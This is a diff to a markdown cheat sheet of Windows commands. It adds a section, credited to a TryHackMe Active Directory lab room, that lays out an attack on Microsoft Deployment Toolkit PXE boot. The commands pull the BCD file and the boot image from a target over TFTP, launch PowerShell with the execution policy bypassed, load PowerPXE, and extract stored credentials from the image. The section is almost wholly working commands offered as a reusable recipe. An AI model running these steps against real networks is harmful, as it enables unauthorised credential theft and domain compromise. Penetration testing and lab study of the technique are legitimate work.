@@ -1,6 +1,7 @@
 # Windows Commands
 
 * [Active Directory](#active-directory)
+* [Microsoft Deployment Toolkit](#microsoft-deployment-tookkit)
 
 
 ## Active Directory
@@ -16,3 +17,39 @@ Force group policy update:
 ```
 gpupdate /force
 ```
+************************************
+## Microsoft Deployment Toolkit
+
+Dowload BDC file via TFTP:
+```
+tftp -i [TARGET-IP] GET "\Tmp\[FILE-PATH]" conf.bcd
+```
+
+Recover the locations of the PXE boot images from the BCD file:
+```
+powershell -executionpolicy bypass
+```
+```
+Import-Module .\PowerPXE.ps1
+```
+```
+$BCDFile = "conf.bcd"
+```
+```
+Get-WimFile -bcdFile $BCDFile
+```
+Download Image:
+```
+tftp -i [TARGET-IP] GET "[PXE-BOOT-IMAGE-LOCATION]" pxeboot.wim
+```
+Recovering Credentials from a PXE Boot Image:
+```
+Get-FindCredentials -WimFile pxeboot.wim
+```
+
+* Credit: https://tryhackme.com/room/breachingad
+
+************************************
+
+## References
+* https://tryhackme.com/room/breachingad
